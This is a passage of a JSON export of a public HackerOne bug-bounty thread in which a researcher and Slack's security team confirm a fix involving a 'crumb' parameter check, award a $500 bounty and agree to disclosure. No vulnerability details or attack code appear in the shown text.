fix!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-02T19:37:43.593Z","updated_at":"2016-08-02T19:37:43.593Z","actor":{"username":"maxfeldman","cleared":false,"url":"/maxfeldman","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/613/37b54dbac5da0a42db471713959c8bf2de89a12d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1103234,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"No worries.\n\nLet me know if there's any questions.","markdown_message":"\u003cp\u003eNo worries.\u003c/p\u003e\n\n\u003cp\u003eLet me know if there\u0026#39;s any questions.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-02T23:25:20.700Z","updated_at":"2016-08-02T23:25:20.700Z","actor":{"username":"nhavis","cleared":false,"url":"/nhavis","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1105465,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Do you have an ETA for the fix?\n\nThanks.","markdown_message":"\u003cp\u003eDo you have an ETA for the fix?\u003c/p\u003e\n\n\u003cp\u003eThanks.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-04T09:08:01.334Z","updated_at":"2016-08-04T09:08:01.334Z","actor":{"username":"nhavis","cleared":false,"url":"/nhavis","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1105492,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @nhavis,\n\nWe actually believe we've patched this - would you mind verifying that the fix has made it to your environment?\n\nThanks!\nMax","markdown_message":"\u003cp\u003eHi \u003ca href=\"/nhavis\"\u003e@nhavis\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eWe actually believe we\u0026#39;ve patched this - would you mind verifying that the fix has made it to your environment?\u003c/p\u003e\n\n\u003cp\u003eThanks!\u003cbr\u003e\nMax\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-04T09:30:18.958Z","updated_at":"2016-08-04T09:30:18.958Z","actor":{"username":"maxfeldman","cleared":false,"url":"/maxfeldman","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/613/37b54dbac5da0a42db471713959c8bf2de89a12d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1105756,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes it's been fixed - the crumb parameter is now checked. How do we proceed?\n\nThanks","markdown_message":"\u003cp\u003eYes it\u0026#39;s been fixed - the crumb parameter is now checked. How do we proceed?\u003c/p\u003e\n\n\u003cp\u003eThanks\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-04T12:57:18.182Z","updated_at":"2016-08-04T12:57:18.182Z","actor":{"username":"nhavis","cleared":false,"url":"/nhavis","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1111728,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Can we resolve the issue?","markdown_message":"\u003cp\u003eCan we resolve the issue?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-08T03:25:30.530Z","updated_at":"2016-08-08T03:25:30.530Z","actor":{"username":"nhavis","cleared":false,"url":"/nhavis","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1113642,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Sorry for the delay! We all just returned from Defcon :)","markdown_message":"\u003cp\u003eSorry for the delay! We all just returned from Defcon :)\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-08T21:46:12.142Z","updated_at":"2016-08-08T21:46:12.142Z","actor":{"username":"maxfeldman","cleared":false,"url":"/maxfeldman","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/613/37b54dbac5da0a42db471713959c8bf2de89a12d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"nhavis","url":"/nhavis"},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1113644,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for an interesting finding! Please keep up the good work :)\n\nThe Slack Security Team","markdown_message":"\u003cp\u003eThanks for an interesting finding! Please keep up the good work :)\u003c/p\u003e\n\n\u003cp\u003eThe Slack Security Team\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-08T21:46:48.133Z","updated_at":"2016-08-08T21:46:48.133Z","actor":{"url":"/slack","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Slack"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"slack","collaborator":{"username":"nhavis","url":"/nhavis"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1117031,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks.\n\nCan we make this public?","markdown_message":"\u003cp\u003eThanks.\u003c/p\u003e\n\n\u003cp\u003eCan we make this public?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-10T13:24:16.423Z","updated_at":"2016-08-10T13:24:16.423Z","actor":{"username":"nhavis","cleared":false,"url":"/nhavis","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1118765,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@nhavis - yes, you can go ahead and request disclosure. thanks!","markdown_message":"\u003cp\u003e\u003ca href=\"/nhavis\"\u003e@nhavis\u003c/a\u003e - yes, you can go ahead and request disclosure. thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-11T07:40:49.178Z","updated_at":"2016-08-11T07:40:49.178Z","actor":{"username":"maxfeldman","cleared":false,"url":"/maxfeldman","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/613/37b54dbac5da0a42db471713959c8bf2de89a12d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1120764,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Disclosure request.","markdown_message":"\u003cp\u003eDisclosure request.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-12T00:02:41.584Z","updated_at":"2016-08-12T00:02:41.584Z","first_to_agree":true,"actor":{"username":"nhavis","cleared":false,"url":"/nhavis","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1131467,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nDid you get the disclosure request?","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eDid you get the disclosure request?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-17T09:57:29.528Z","updated_at":"2016-08-17T09:57:29.528Z","actor":{"username":"nhavis","cleared":false,"url":"/nhavis","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1133031,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks @nhavis!","markdown_message":"\u003cp\u003eThanks \u003ca href=\"/nhavis\"\u003e@nhavis\u003c/a\u003e!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-17T21:39:53.918Z","updated_at":"2016-08-17T21:39:53.918Z","actor":{"username":"maxfeldman","cleared":false,"url":"/maxfeldman","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/613/37b54dbac5da0a42db471713959c8bf2de89a12d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1133032,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-17T21:39:54.023Z","updated_at":"2016-08-17T21:39:54.023Z","actor":{"username":"maxfeldman","cleared":false,"url":"/maxfeldman","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/613/37b54dbac5da0a42db471713959c8bf2de89a12d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}